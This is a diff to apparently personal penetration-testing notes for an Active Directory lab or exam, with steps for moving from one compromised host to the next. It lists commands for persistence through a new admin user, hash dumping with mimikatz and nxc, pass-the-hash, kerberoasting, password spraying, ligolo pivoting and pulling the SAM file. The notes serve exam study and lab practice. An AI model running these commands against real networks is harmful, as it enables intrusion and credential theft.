@@ -97,6 +97,7 @@ net accounts
 4) Great! You managed to get admin! You should do the following first:
 - Get Persistence. My preferred method is to add a new local user and grant it admin, RDP and winrm rights. This uses native LOLBAS stuff and wont crash your machine. 
 - Dump Hashes using mimikatz or nxc. Sometimes mimikatz can't work properly. I had issues getting mimikatz to run in evil-winrm (my suspicion is that there is User Access Control involved.) so you can either launch a cmd shell or RDP to get mimikatz to run or you can use nxc to do this (though you need either the Admin hash or your new custom local user who is admin). There are many ways to skin a cat so when something dont work, try another way
+- Remember, if you have NTLM hash, you don't necessarily need to crack it as you can pass-the-hash for a lot of the attacks
 
 ```cmd
 # mimikatz usage. Make sure you upload mimikatz.exe, mimispool.dll, mimilib.dll and mimidrv.sys to the same directory!
@@ -114,7 +115,56 @@ lsadump::cache
 ```
 Using NXC, you need local admin hash/password!
 ```bash
+# the below is the equivalent of running mimikatz's sekurlsa::logonpasswords
+# -H for NTLM hash
+nxc smb <target ip> -u <admin user> -p <password> --sam --lsa --local-auth
+
+# this is the equivalent of the mimikatz's lsadump
+nxc smb <target ip> -u <admin user> -p <password> -M lsassy --local-auth
+```
+
+- Enumerate MS01 again as Admin. Comb through the Administrator's folder and then maybe run winpeas for good measure.
+
+## MS02
+
+5) check for kerberoast and as-rep roast since it is a low hanging fruit
+
+```bash
+# kerberoast check
+sudo impacket-GetUserSPNs -request -dc-ip <dc01 ip> -outputfile kerber.hash <domain>/<user>
+# as rep check
+sudo impacket-GetNPUsers -request -dc-ip <dc01 ip> -outputfile asrep.hash <domain>/<user>
 
 ```
 
-- Enumerate MS01 again as Admin.
+6) set up a ligolo agent on MS01. You could do a nmap scan of MS02 but it may take a while. In general, the smb port should be open so you can password spray with the domain users and all the passwords/Hashes you have obtained.
+
+```bash
+# enumerate domain users using nxc using your given domain creds
+nxc smb <DC IP> -u <valid domain user> -p <password> --user
+# this will output all the domain users. I then used sublime text to process the output into a domain users list
+
+# Password spray against MS02 (assuming that there is no lockout policy)
+# --continue-on-success flag will tell nxc to continue spraying even when a valid pair of creds is found
+nxc smb <MS02 IP> -u <domain user list> -p <password list> --continue-on-success
+nxc smb <MS02 IP> -u <domain user list> -p <password list> --continue-on-success --local-auth
+nxc smb <MS02 IP> -u <domain user list> -H <ntlm list> --continue-on-success
+nxc smb <MS02 IP> -u <domain user list> -H <ntlm list> --continue-on-success --local-auth
+
+# if FTP, SSH,RDP,MSSQL,WINRM ports discovered do the following:
+# replace ssh below with any of the protocols above
+nxc ssh <MS02 IP> -u <domain user list> -p <password list> --continue-on-success
+nxc ssh <MS02 IP> -u <domain user list> -p <password list> --continue-on-success --local-auth
+```
+
+7) Here is the part where it is slightly tricky. If you need to get a reverse shell back from MS02 to kali, you will need to open up a listener port on the ligolo agent on MS01. Refer to the ligolo page for more information. 
+
+8) if you can get a shell either via winrm,rdp,ssh,mssql, you can then upload all your tooling. Do the same thing as with MS01 with the usual enumeration. If for some wierd reason, you have issues downloading from or uploading files to MS02, you can use nxc to download and upload files:
+
+```bash
+# note the double slash
+# replace mssql with smb
+nxc mssql <MS02 IP> -u sql_svc -p 'pass' --get-file 'C:\\Windows\\System32\\SAM' SAM  
+
+nxc mssql <MS02 IP> -u sql_svc -p 'pass' --put-file SigmaPotato.exe 'C:\\Users\\Public\\potato.exe'
+```
